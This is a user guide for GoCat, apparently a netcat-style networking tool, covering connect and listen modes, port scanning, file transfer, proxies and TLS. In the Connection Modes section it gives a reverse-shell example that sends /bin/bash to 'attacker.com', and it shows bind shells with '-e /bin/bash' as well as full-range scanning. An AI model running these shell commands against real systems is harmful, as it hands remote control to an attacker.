# 📖 GoCat User Guide

Welcome to the comprehensive GoCat user guide! This document will help you master all aspects of GoCat, from basic usage to advanced techniques.

## 📋 Table of Contents

- [Getting Started](#-getting-started)
- [Basic Commands](#-basic-commands)
- [Connection Modes](#-connection-modes)
- [File Transfer](#-file-transfer)
- [Port Scanning](#-port-scanning)
- [Advanced Features](#-advanced-features)
- [Configuration](#-configuration)
- [Tips and Tricks](#-tips-and-tricks)
- [Troubleshooting](#-troubleshooting)

---

## 🚀 Getting Started

### First Steps

After installing GoCat, verify it's working:

```bash
# Check version
gocat --version

# View help
gocat --help

# Test basic connectivity
gocat connect google.com 80
```

### Basic Syntax

```bash
gocat [global-options] <command> [command-options] [arguments]
```

### Global Options

- `-v, --verbose` - Enable verbose output
- `-q, --quiet` - Suppress non-essential output
- `-h, --help` - Show help information
- `--version` - Show version information
- `--config FILE` - Use custom configuration file
- `--log-file FILE` - Log to specific file
- `--log-level LEVEL` - Set logging level (debug, info, warn, error)

---

## 🎯 Basic Commands

### Connect Command

Connect to a remote host and port:

```bash
# Basic connection
gocat connect <host> <port>

# Examples
gocat connect example.com 80
gocat connect 192.168.1.100 22
gocat connect "[2001:db8::1]" 80  # IPv6
```

#### Connect Options

- `-s, --shell SHELL` - Shell to execute (default: /bin/sh)
- `-t, --timeout DURATION` - Connection timeout (default: 30s)
- `-r, --retry COUNT` - Retry attempts (default: 3)
- `-k, --keep-alive` - Enable TCP keep-alive
- `-u, --udp` - Use UDP instead of TCP
- `-4, --ipv4` - Force IPv4
- `-6, --ipv6` - Force IPv6

### Listen Command

Listen for incoming connections:

```bash
# Basic listener
gocat listen <port>

# Examples
gocat listen 8080
gocat listen 0.0.0.0 8080  # Bind to all interfaces
gocat listen 127.0.0.1 8080  # Bind to localhost only
```

#### Listen Options

- `-e, --exec COMMAND` - Execute command for each connection
- `-i, --interactive` - Interactive mode with PTY
- `-l, --local` - Local interactive mode
- `-b, --bind ADDRESS` - Bind to specific address
- `-m, --max-conn COUNT` - Maximum concurrent connections
- `-k, --keep-alive` - Keep connections alive
- `-u, --udp` - Use UDP instead of TCP

### Scan Command

Scan ports on a target host:

```bash
# Basic port scan
gocat scan <host> <ports>

# Examples
gocat scan example.com 80
gocat scan 192.168.1.1 22,80,443
gocat scan 10.0.0.1 1-1000
gocat scan localhost 8000-9000
```

#### Scan Options

- `-t, --timeout DURATION` - Scan timeout per port (default: 3s)
- `-c, --concurrent COUNT` - Concurrent scans (default: 100)
- `-u, --udp` - Scan UDP ports
- `-T, --tcp` - Scan TCP ports (default)
- `-A, --all` - Scan both TCP and UDP
- `-v, --verbose` - Show closed ports too
- `-q, --quiet` - Only show open ports

---

## 🔗 Connection Modes

### Client Mode (Connect)

Connect to a remote service:

```bash
# HTTP request
echo "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | gocat connect example.com 80

# SSH-like connection
gocat connect -s /bin/bash server.example.com 22

# Reverse shell
gocat connect -s /bin/bash attacker.com 4444
```

### Server Mode (Listen)

Wait for incoming connections:

```bash
# Simple listener
gocat listen 8080

# Execute command on connection
gocat listen -e /bin/bash 8080

# Interactive shell
gocat listen -i 8080

# Local interactive (with history)
gocat listen -l 8080
```

### Interactive Modes

#### Standard Interactive (`-i`)
- Full PTY support
- Terminal emulation
- Signal forwarding
- Real-time interaction

#### Local Interactive (`-l`)
- Command history
- Tab completion
- Line editing
- Local shell features

---

## 📁 File Transfer

### Sending Files

```bash
# Receiver (start first)
gocat listen 8080 > received_file.txt

# Sender
gocat connect receiver.com 8080 < file_to_send.txt
```

### Receiving Files

```bash
# Sender (start first)
gocat listen 8080 < file_to_send.txt

# Receiver
gocat connect sender.com 8080 > received_file.txt
```

### Directory Transfer

```bash
# Send directory (tar)
tar czf - /path/to/directory | gocat connect receiver.com 8080

# Receive directory
gocat listen 8080 | tar xzf -
```

### Large File Transfer with Progress

```bash
# Using pv for progress
pv large_file.zip | gocat connect receiver.com 8080

# Receiver
gocat listen 8080 | pv > large_file.zip
```

---

## 🔍 Port Scanning

### Single Port

```bash
gocat scan example.com 80
```

### Multiple Ports

```bash
# Comma-separated
gocat scan example.com 22,80,443,8080

# Port ranges
gocat scan example.com 1-1000

# Mixed
gocat scan example.com 22,80,443,8000-9000
```

### Advanced Scanning

```bash
# Fast scan (more concurrent connections)
gocat scan -c 500 example.com 1-65535

# UDP scan
gocat scan -u example.com 53,67,68,123

# Both TCP and UDP
gocat scan -A example.com 53,80,443

# Verbose output
gocat scan -v example.com 1-100

# Quiet mode (only open ports)
gocat scan -q example.com 1-1000
```

### Scan Output Formats

```bash
# JSON output
gocat scan --output json example.com 1-1000

# XML output
gocat scan --output xml example.com 1-1000

# Save to file
gocat scan example.com 1-1000 > scan_results.txt
```

---

## 🔧 Advanced Features

### Proxy Support

```bash
# SOCKS5 proxy
gocat connect --proxy socks5://proxy.example.com:1080 target.com 80

# HTTP proxy
gocat connect --proxy http://proxy.example.com:8080 target.com 443

# Authenticated proxy
gocat connect --proxy socks5://user:pass@proxy.example.com:1080 target.com 80
```

### SSL/TLS Connections

```bash
# HTTPS connection
gocat connect --ssl example.com 443

# With certificate verification
gocat connect --ssl --verify-cert example.com 443

# Custom CA certificate
gocat connect --ssl --ca-cert /path/to/ca.pem example.com 443

# SSL server
gocat listen --ssl --ssl-cert cert.pem --ssl-key key.pem 8443
```

### IPv6 Support

```bash
# Force IPv6
gocat connect -6 example.com 80

# IPv6 address
gocat connect "[2001:db8::1]" 80

# IPv6 listener
gocat listen -6 8080
```

### UDP Mode

```bash
# UDP client
gocat connect -u example.com 53

# UDP server
gocat listen -u 8080

# DNS query example
echo -e "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01" | gocat connect -u 8.8.8.8 53
```

### Connection Persistence

```bash
# Keep-alive
gocat connect -k example.com 80

# Retry on failure
gocat connect -r 5 example.com 80

# Custom timeout
gocat connect -t 60s example.com 80
```

---

## ⚙️ Configuration

### Configuration File

Create `~/.config/gocat/config.yaml`:

```yaml
# Default settings
defaults:
  timeout: 30s
  retry: 3
  keep_alive: true
  shell: /bin/bash
  
# Logging configuration
logging:
  level: info
  file: /var/log/gocat.log
  format: json
  
# Network settings
network:
  ipv6: false
  buffer_size: 4096
  max_connections: 100
  
# Security settings
security:
  verify_cert: true
  ca_cert: /etc/ssl/certs/ca-certificates.crt
  
# Proxy settings
proxy:
  default: socks5://localhost:1080
  
# Color theme
colors:
  success: green
  error: red
  warning: yellow
  info: blue
  debug: gray
```

### Environment Variables

```bash
# Set default timeout
export GOCAT_TIMEOUT=60s

# Set default shell
export GOCAT_SHELL=/bin/zsh

# Enable debug logging
export GOCAT_LOG_LEVEL=debug

# Set proxy
export GOCAT_PROXY=socks5://localhost:1080
```

### Command-line Configuration

```bash
# Use custom config file
gocat --config /path/to/config.yaml connect example.com 80

# Override config settings
gocat --timeout 60s --retry 5 connect example.com 80
```

---

## 💡 Tips and Tricks

### Shell Aliases

Add to your `.bashrc` or `.zshrc`:

```bash
# Quick aliases
alias nc='gocat'
alias listen='gocat listen'
alias connect='gocat connect'
alias scan='gocat scan'

# Common operations
alias webserver='gocat listen -e "echo HTTP/1.1 200 OK; echo; echo Hello World" 8080'
alias portcheck='gocat scan'
```

### One-liners

```bash
# Quick web server
echo "Hello World" | gocat listen 8080

# Port knock
for port in 1000 2000 3000; do gocat connect target.com $port; done

# Banner grab
echo "" | gocat connect -t 5s target.com 22

# HTTP request
printf "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | gocat connect example.com 80
```

### Scripting with GoCat

```bash
#!/bin/bash
# Port scan script

HOST="$1"
if [ -z "$HOST" ]; then
    echo "Usage: $0 <host>"
    exit 1
fi

echo "Scanning common ports on $HOST..."
gocat scan "$HOST" 21,22,23,25,53,80,110,143,443,993,995

echo "Scanning high ports..."
gocat scan "$HOST" 8000-9000
```

### Integration with Other Tools

```bash
# With nmap
nmap -p- --open target.com | grep "^[0-9]" | cut -d'/' -f1 | xargs -I {} gocat connect target.com {}

# With curl
gocat listen 8080 | while read line; do curl -X POST -d "$line" http://logger.com/log; done

# With jq for JSON processing
gocat scan --output json target.com 1-1000 | jq '.open_ports[]'
```

---

## 🔧 Troubleshooting

### Common Issues

#### Connection Refused

```bash
# Check if port is open
gocat scan target.com 80

# Try different port
gocat connect target.com 443

# Check firewall
sudo ufw status
```

#### Permission Denied

```bash
# Use sudo for privileged ports
sudo gocat listen 80

# Or use unprivileged port
gocat listen 8080
```

#### Timeout Issues

```bash
# Increase timeout
gocat connect -t 60s slow-server.com 80

# Enable keep-alive
gocat connect -k server.com 80
```

#### IPv6 Problems

```bash
# Force IPv4
gocat connect -4 example.com 80

# Check IPv6 connectivity
ping6 google.com
```

### Debug Mode

```bash
# Enable verbose output
gocat -v connect example.com 80

# Enable debug logging
gocat --log-level debug connect example.com 80

# Log to file
gocat --log-file debug.log connect example.com 80
```

### Performance Issues

```bash
# Increase buffer size
gocat --buffer-size 8192 connect example.com 80

# Reduce concurrent connections for scanning
gocat scan -c 50 target.com 1-1000

# Use UDP for faster scanning
gocat scan -u target.com 1-1000
```

---

## 🎯 Use Cases

### Network Testing

```bash
# Test connectivity
gocat connect google.com 80

# Check if service is running
gocat scan localhost 22,80,443

# Test firewall rules
gocat connect internal-server.com 8080
```

### File Transfer

```bash
# Quick file share
gocat listen 8080 < file.txt
# On another machine:
gocat connect first-machine.com 8080 > file.txt
```

### Remote Administration

```bash
# Remote shell
gocat listen -i 8080
# Connect from remote:
gocat connect admin-server.com 8080
```

### Development and Testing

```bash
# Mock HTTP server
echo "HTTP/1.1 200 OK\r\n\r\nHello World" | gocat listen 8080

# Test API endpoints
printf "GET /api/health HTTP/1.1\r\nHost: api.example.com\r\n\r\n" | gocat connect api.example.com 80
```

### Security Testing

```bash
# Port discovery
gocat scan target.com 1-65535

# Banner grabbing
echo "" | gocat connect -t 5s target.com 22

# Service enumeration
for port in $(gocat scan -q target.com 1-1000); do
    echo "Checking port $port"
    echo "" | gocat connect -t 3s target.com $port
done
```

---

## 📚 Further Reading

- [Installation Guide](installation.md) - How to install GoCat
- [Advanced Usage](advanced-usage.md) - Advanced features and techniques
- [API Reference](api-reference.md) - Complete command reference
- [Contributing](../CONTRIBUTING.md) - How to contribute to GoCat
- [GitHub Repository](https://github.com/ibrahmsql/gocat) - Source code and issues

---

## 🆘 Getting Help

If you need help:

- 📖 Check the [documentation](https://docs.gocat.dev)
- 🐛 [Report bugs](https://github.com/ibrahmsql/gocat/issues/new?template=bug_report.yml)
- 💡 [Request features](https://github.com/ibrahmsql/gocat/issues/new?template=feature_request.yml)
- 💬 [Join our Discord](https://discord.gg/gocat)
- 📧 [Email support](mailto:support@gocat.dev)

**Happy networking with GoCat!** 🚀